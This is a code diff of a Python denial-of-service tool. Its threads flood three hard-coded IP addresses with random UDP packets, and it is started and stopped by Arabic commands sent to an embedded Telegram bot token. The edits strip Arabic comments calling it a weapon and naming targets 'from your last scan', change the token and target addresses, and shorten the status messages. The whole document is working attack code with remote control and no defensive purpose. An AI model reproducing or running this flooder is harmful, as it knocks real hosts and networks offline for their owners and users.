@@ -1,10 +1,8 @@
 import socket, random, threading, time, requests
 
-# --- بيانات السيطرة ---
-TOKEN = "8683678490:AAHH0LE8XMV7XVWNE_nyuTG4NP1_FjBSvXA"
-ID = "8343786519"
-# الأهداف المحددة من فحصك الأخير
-TARGETS = ["169.224.89.6", "37.239.25.115", "192.168.0.1"]
+TOKEN = "8603678400:AAHHOLE8XWV7XVWNE_nyuTG4NP1_FjBSvXA"
+ID = "8343706519"
+TARGETS = ["109.224.80.6", "37.239.25.115", "192.168.0.1"]
 STATUS = "STOPPED"
 
 def telegram(msg):
@@ -16,7 +14,6 @@ def cloud_sniper():
     while True:
         if STATUS == "RUNNING":
             try:
-                # نبض سحابي مكثف
                 for ip in TARGETS:
                     payload = random._urandom(1024)
                     sock.sendto(payload, (ip, 80))
@@ -28,7 +25,7 @@ def cloud_sniper():
 def cloud_controller():
     global STATUS
     last_id = 0
-    telegram("🛰️ MONITOR CLOUD: ONLINE\nتم رفع السلاح للسحابة بنجاح.\nبانتظار أمر 'اشتغل' من التلغرام.")
+    telegram("🛰️ MONITOR CLOUD: ONLINE")
     while True:
         try:
             url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_id+1}&timeout=30"
@@ -38,13 +35,13 @@ def cloud_controller():
                 msg = up.get("message", {}).get("text", "").strip()
                 if msg == "اشتغل":
                     STATUS = "RUNNING"
-                    telegram("🔥 الإطلاق السحابي بدأ.. راقب الـ Ping!")
+                    telegram("🔥 بدأ الخنق العميق..")
                 elif msg == "توقف":
                     STATUS = "STOPPED"
-                    telegram("🛑 توقف النظام.")
+                    telegram("🛑 تم التوقف.")
         except: time.sleep(5)
 
 if __name__ == "__main__":
-    for _ in range(80): # استغلال كامل قوة السيرفرات السحابية
+    for _ in range(80):
         threading.Thread(target=cloud_sniper, daemon=True).start()
     cloud_controller()
